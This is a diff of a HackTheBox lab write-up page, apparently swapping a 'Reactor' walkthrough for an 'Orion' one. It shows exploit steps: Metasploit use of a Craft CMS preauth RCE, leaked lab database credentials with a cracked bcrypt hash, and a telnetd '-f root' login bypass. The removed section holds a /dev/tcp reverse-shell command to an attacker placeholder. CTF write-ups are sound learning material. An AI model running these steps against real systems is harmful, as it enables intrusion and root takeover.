@@ -4,8 +4,8 @@
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <meta name="theme-color" content="#030305"/>
-<title>Reactor - HTB Write Up | pumkin</title>
-<meta name="description" content="HackTheBox Reactor (Easy, Linux) full write up: Next.js RCE → SQLite credential theft → SSH → Node.js Inspector (port 9229) → root."/>
+<title>Orion - HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Orion (Easy, Linux) full write up: Craft CMS 5.6.16 preauth RCE (CVE-2025-32432) → DB creds → SSH → telnet CVE-2026-24061 root."/>
 <link rel="icon" href="../cat.png"/>
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
@@ -67,7 +67,7 @@ h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-tran
     <div class="writeup-body">
 
       <p class="meta">hackthebox / easy / linux</p>
-      <h1>Reactor</h1>
+      <h1>Orion</h1>
 
       <div class="info-grid">
         <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
@@ -76,86 +76,79 @@ h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-tran
       </div>
 
       <h2>Summary</h2>
-      <p>Reactor is a straightforward web-to-root chain. We gain an initial shell by exploiting a Next.js application, recover <strong>crackable hashes from a SQLite database</strong> for lateral movement to the <code>engineer</code> user via SSH, and finally pwn the box through a <strong>Node.js Inspector</strong> (port 9229) listening on localhost - a full OS command execution primitive.</p>
+      <p>Orion is an easy Linux box that chains two preauth CVEs with an environment leak. A <strong>Craft CMS 5.6.16 Image Transform preauth RCE (CVE-2025-32432)</strong> gives a shell as <code>www-data</code>. The app's <code>env</code> leaks the MySQL root password, which exposes a bcrypt hash that cracks to <code>adam</code>'s SSH login. The box hosts <strong>telnetd 2.7</strong> on loopback, vulnerable to <strong>CVE-2026-24061</strong> - a <code>USER='-f root'</code> trick drops us straight to a root shell.</p>
 
       <h2>Skills Required</h2>
       <ul>
-        <li>Web application enumeration</li>
-        <li>Offline hash cracking fundamentals</li>
+        <li>CMS fingerprinting and CVE research</li>
+        <li>Metasploit module usage</li>
+        <li>Hash identification and cracking</li>
       </ul>
 
       <h2>Skills Learned</h2>
       <ul>
-        <li>Using Metasploit modules for framework-specific RCE</li>
-        <li>Local port forwarding for internal services</li>
-        <li>Node.js Inspector (port 9229) as an RCE primitive</li>
-        <li>Why <code>bash -c</code> is required for <code>/dev/tcp</code> payloads in <code>execSync</code></li>
+        <li>Exploiting Craft CMS preauth Image Transform RCE (CVE-2025-32432)</li>
+        <li>Harvesting credentials from environment variables</li>
+        <li>Abusing telnetd 2.7 <code>-f</code> login bypass (CVE-2026-24061)</li>
       </ul>
 
-      <h2>Reconnaissance</h2>
-      <p>An initial full port scan reveals two open ports.</p>
-      <ul>
-        <li><strong>Port 22</strong> - SSH</li>
-        <li><strong>Port 3000</strong> - HTTP</li>
-      </ul>
-      <pre>nmap -sC -sV -p- &lt;target_ip&gt;</pre>
-      <p>Browsing to <code>http://&lt;target_ip&gt;:3000</code> reveals a web application built with <strong>Next.js</strong> and <strong>React</strong>. Directory and virtual host enumeration with both <code>feroxbuster</code> and <code>ffuf</code> return no interesting results.</p>
-      <pre>feroxbuster -u http://&lt;target_ip&gt;:3000
-ffuf -u http://&lt;target_ip&gt;:3000 -H "Host: FUZZ.&lt;target_ip&gt;" -w /path/to/wordlist</pre>
+      <h2>Enumeration</h2>
+      <p>The scan is minimal: SSH and nginx serving <code>Orion Telecom</code>.</p>
+      <pre>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Orion Telecom</pre>
+      <p>No SMB/LDAP/WinRM. Directory brute force against the site:</p>
+      <pre>admin     [Status: 302]
+assets    [Status: 301]
+logout    [Status: 302]</pre>
 
-      <h2>Initial Access</h2>
-      <h3>Exploiting the Next.js / React application</h3>
-      <p>Using Metasploit's <code>react2shell</code> module against the Next.js application yields an initial limited shell.</p>
-      <pre>msfconsole
-use &lt;react2shell module&gt;
-set RHOSTS &lt;target_ip&gt;
-set RPORT 3000
-run</pre>
+      <h2>Foothold</h2>
+      <h3>Craft CMS preauth RCE</h3>
+      <p><code>/admin</code> reveals <strong>Craft CMS 5.6.16</strong>. A known vuln applies: <code>CVE-2025-32432</code>, the Craft CMS Image Transform preauth RCE. The standalone PoC (CTY-Research-1) led nowhere, but Metasploit has a module that lands it cleanly.</p>
+      <pre>msf6 &gt; search craft cms
 
-      <h2>Credential Discovery</h2>
-      <h3>SQLite database</h3>
-      <p>While enumerating the filesystem from the limited shell, a <strong>SQLite database file</strong> is discovered containing two hashed passwords.</p>
-      <pre>find / -name "*.db" 2>/dev/null
-sqlite3 &lt;database_file&gt;
-.tables
-SELECT * FROM users;</pre>
-      <p>The hashes are cracked offline (e.g. with <code>hashcat</code> or <code>john</code>), revealing credentials for the <code>engineer</code> user.</p>
+  exploit/linux/http/craftcms_preauth_rce_cve_2025_32432  2025-04-14  excellent  Craft CMS Image Transform Preauth RCE
 
-      <h2>Lateral Movement</h2>
-      <h3>SSH access</h3>
-      <p>Using the cracked credentials, SSH access is obtained as the <code>engineer</code> user.</p>
-      <pre>ssh engineer@&lt;target_ip&gt;</pre>
+msf6 &gt; use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
+msf6 &gt; set rhosts orion.htb
+msf6 &gt; set lhost 10.10.15.63
+msf6 &gt; exploit</pre>
+      <p>A meterpreter shell drops as <code>www-data</code>.</p>
+
+      <h3>Env leak → DB → adam</h3>
+      <p>The app's environment hands us the MySQL root password.</p>
+      <pre>CRAFT_ENVIRONMENT=dev
+CRAFT_DB_DATABASE=orion
+CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8</pre>
+      <pre>mysql -u root -p'SuperSecureCraft123Pass!'
+select * from users;
+
+adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS</pre>
+      <p>The hash cracks:</p>
+      <pre>adam@orion.htb
+darkangel</pre>
+      <p>SSH in and grab the user flag.</p>
+      <pre>ssh adam@orion.htb</pre>
 
       <h2>Privilege Escalation</h2>
-      <h3>Internal port discovery</h3>
-      <p>Enumerating listening ports reveals an internal service on <code>localhost:9229</code> - the <strong>Node.js Inspector/Debugger</strong> protocol.</p>
-      <pre>ss -tlnp
-# or
-netstat -tlnp</pre>
-
-      <h3>Port forwarding</h3>
-      <p>The internal port is forwarded to the attacker machine over SSH.</p>
-      <pre>ssh -L 9229:127.0.0.1:9229 engineer@&lt;target_ip&gt;</pre>
-      <p>Confirming the port responds:</p>
-      <pre>curl http://localhost:9229
-# WebSockets request was expected</pre>
-
-      <h3>Node.js Inspector RCE</h3>
-      <p>Connect to the Node.js debugger using the built-in <code>node inspect</code> client:</p>
-      <pre>node inspect localhost:9229</pre>
-      <p>From the debug console, OS commands can be executed via the <code>child_process</code> module:</p>
-      <pre>exec("process.mainModule.require('child_process').execSync('id').toString()")</pre>
-      <p>A reverse shell is obtained by wrapping the payload in <code>bash -c</code>, ensuring <code>bash</code> (rather than <code>/bin/sh</code>) handles the redirection syntax:</p>
-      <pre>exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/&lt;attacker_ip&gt;/1337 0>&1\"').toString()")</pre>
-      <p>With a listener running on the attacker machine:</p>
-      <pre>nc -lvnp 1337</pre>
-      <p>A shell is received as the privileged user, completing the machine.</p>
+      <h3>Loopback telnet</h3>
+      <p>Listening ports show something odd on loopback.</p>
+      <pre>Local-only listeners (loopback)
+tcp   LISTEN 0   10   127.0.0.1:23     0.0.0.0:*
+tcp   LISTEN 0   80   127.0.0.1:3306   0.0.0.0:*</pre>
+      <p>Port 23 is <strong>telnet</strong>, and it's <code>telnetd 2.7</code>. That version has a login-bypass CVE (<code>CVE-2026-24061</code>) - passing <code>USER='-f root'</code> runs <code>login</code> with the <code>-f</code> flag, which skips authentication and drops straight into root.</p>
+      <pre>USER='-f root' telnet -a 127.0.0.1</pre>
+      <p>Root shell, and the root flag.</p>
 
       <h2>Key Takeaways</h2>
       <ul>
-        <li><strong>Node.js Inspector (port 9229)</strong> exposed internally is a critical misconfiguration - it allows full OS command execution via the debug protocol.</li>
-        <li><strong><code>bash -c "..."</code></strong> is necessary when passing bash-specific syntax (like <code>&gt;&amp;</code> redirections and <code>/dev/tcp</code>) through <code>execSync</code>, since it defaults to <code>/bin/sh</code> which does not support these features.</li>
-        <li><strong>Hashed passwords stored in local database files</strong> are a common foothold for lateral movement on HTB machines.</li>
+        <li><strong>Check env vars</strong> - <code>CRAFT_DB_PASSWORD</code> leaked root DB access that turned into SSH creds.</li>
+        <li><strong>Fingerprint every service</strong> - an easy box can hide a root shell in a loopback-only telnetd.</li>
+        <li><strong>Know the CVE landscape</strong> - preauth CMS RCEs make footholds trivial when the PoC works.</li>
+        <li><strong>Small loopback services matter</strong> - anything listening on 127.0.0.1 is an internal attack surface after the first shell.</li>
       </ul>
 
     </div>
